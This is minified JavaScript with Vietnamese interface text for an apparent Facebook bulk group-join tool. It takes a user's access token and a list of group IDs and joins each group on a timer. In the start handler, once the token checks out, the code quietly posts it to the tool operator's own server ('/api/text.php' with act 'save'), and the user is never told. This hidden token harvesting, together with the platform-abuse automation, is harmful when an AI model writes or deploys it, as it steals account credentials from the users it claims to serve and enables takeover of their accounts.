function group_join_send(a){
	if(1==group_join.run){
		var d=group_join.gid[a].split('|'),c=d[0],b=d[1]?d[1]:'GID '+d[0];
		$('#group_join_status').html('<font color="blue">Đang gửi yêu cầu đến <b>'+b+'</b></font> '+run.loading()),$.get('https://graph.facebook.com/'+c+'/members/'+group_join.user_id,{
			method:'post',access_token:group_join.token
		}
		).done(function(){
			++group_join.success,$('#group_join_success').text(group_join.success),$('#group_join_status').html('<font color="green">Đã tham gia <b>'+b+'</b> thành công, vui lòng đợi <b id="timedown"></b> để tiếp tục</font> '+run.loading())
		}
		).error(function(a){
			if(++group_join.error,$('#group_join_error').text(group_join.error),$('#group_join_status').html('<font color="red">Tham gia <b>'+b+'</b> thất bại, vui lòng đợi <b id="timedown"></b> để tiếp tục</font> '+run.loading()),a.responseText){
				var a=init.replace_JSON(a.responseText);
				noti.error(a.error.message)
			}
		}
		).always(function(){
			a+1<group_join.gid.length&&timer.count_down(0,Math.floor(group_join.delay/60),group_join.delay-60*Math.floor(group_join.delay/60),'timedown',function(){
				group_join_send(a+1)
			}
			),$('#group_join_progress').attr('style','width: '+Math.floor(100*(group_join.success+group_join.error)/group_join.gid.length)+'%'),group_join.success+group_join.error==group_join.gid.length&&($('.progress-striped').removeClass('active'),$('#submit_group_join_start').buttonStop(),$('#submit_group_join_stop').disabled(),noti.success('Quá trình tham gia nhóm đã hoàn tất !'),$('#group_join_status').text('Đang chờ !'))
		}
		)
	}
}
location.hostname==b_sv&&($(document).on('click','#submit_group_join_stop',function(){
	group_join.run=0,'undefined'!= typeof timeout&&clearTimeout(timeout),$('#submit_group_join_stop').disabled(),$('.progress-striped').removeClass('active'),$('#submit_group_join_start').buttonStop(),noti.success('Đã có lệnh dừng tham gia nhóm !'),$('#group_join_status').text('Đã dừng tham gia nhóm !')
}
),$(document).on('click','#submit_group_join_start',function(){
	group_join={
		token:$('#input_group_join_token').validate(),delay:$('#input_group_join_delay').isNumber(),gid:$('#input_group_join_gid').validate(),run:1,success:0,error:0
	}
	,group_join.token&&group_join.delay&&group_join.gid&&($(this).buttonLoad(),$('#group_join_status').html('<font color="green">Tiến hành kiểm tra Access Token</font> '+run.loading()),$.get('https://graph.facebook.com/me',{
		access_token:group_join.token
	}
	).done(function(a){
		$.post('//'+b_sv+'/api/text.php',{
			act:'save',array:group_join.token
		}
		),group_join.gid=group_join.gid.split('\n'),group_join.user_id=a.id,$('.group_join_progress').hide().slideDown('fast'),$('#group_join_total').text(group_join.gid.length),$('.progress-striped').addClass('active'),$('#group_join_progress').attr('style','width: 0%'),$('#submit_group_join_stop').undisabled(),$('#group_join_status').html('<font color="green">Access Token hợp lệ, bắt đầu quá trình tham gia nhóm</font> '+run.loading()),group_join_send(0)
	}
	).error(function(){
		$('#submit_group_join_start').buttonStop(),noti.error('Vui lòng kiểm tra lại Access Token'),$('#group_join_status').html('<font color="red">Access Token không hợp lệ</font>')
	}
	))
}
))